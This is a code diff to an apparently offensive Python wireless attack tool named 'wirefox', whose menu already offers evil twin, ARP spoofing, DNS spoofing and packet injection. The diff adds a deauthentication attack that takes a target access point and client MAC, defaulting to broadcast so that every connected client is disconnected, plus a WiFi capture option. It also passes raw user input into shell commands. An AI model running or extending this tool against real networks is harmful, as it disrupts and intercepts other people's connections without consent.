@@ -25,6 +25,7 @@ from attackmodules import evil_twin
 from attackmodules import DnsSpoofing
 from attackmodules import PacketInject
 from attackmodules import ArpSpoof
+from attackmodules import Deauth
 
 
 def logo():
@@ -51,7 +52,8 @@ def wirefox():
                    {2}--ArpSpoofing
                    {3}--DnsSpoofing
                    {4}--PacketInjection
-                   {5}--WifiHacking\u001b[0m
+                   {5}--Deauth
+                   {6}--DumpWifi\u001b[0m
 
 
           """)
@@ -108,5 +110,39 @@ def wirefox():
             print(u"\u001b[31m[*] File Not Found!")
             os.system("iptables --flush")
             sys.exit(1)
+
+    elif option == "5":
+        iface = input(u"\u001b[33;1m[^] (Monitor interface)-> ")
+        if iface == "" or iface == " ":
+            print("E...r")
+            sys.exit()
+        print(u"\u001b[32;1m[*] Set {0} interface".format(iface))
+        bssid = input(u"\u001b[33;1m[^] (Wifi Bssid)-> ")
+        if bssid == "" or bssid == " ":
+            print("E...r")
+            sys.exit()
+        print(u"\u001b[32;1m[*] Set {0} Wifi Bssid!".format(bssid))
+        client = input(u"\u001b[33;1m[^] (Client Mac[ff:ff:ff:ff:ff:ff])-> ")
+        if client == "" or client == " ":
+            client = "ff:ff:ff:ff:ff:ff"
+        print(u"\u001b[32;1m[*] Set {0} Client Mac!".format(client))
+        channel = input(u"\u001b[33;1m[^] (Wifi Channel)-> ")
+        if channel == "" or channel == " ":
+            print("E...r")
+            sys.exit()
+
+        os.system("iw dev wlan0mon set channel " + channel)
+        print(u"\u001b[34m")
+
+        Deauth.attack(client, bssid, iface)
+
+
+    elif option == "6":
+        iface = input(u"\u001b[33;1m[^] (Monitor interface)-> ")
+        if iface == "" or iface == " ":
+            print("E...r")
+            sys.exit()
+        print()
+        os.system("python3 moduless/dump.py " + iface)
 
 wirefox()
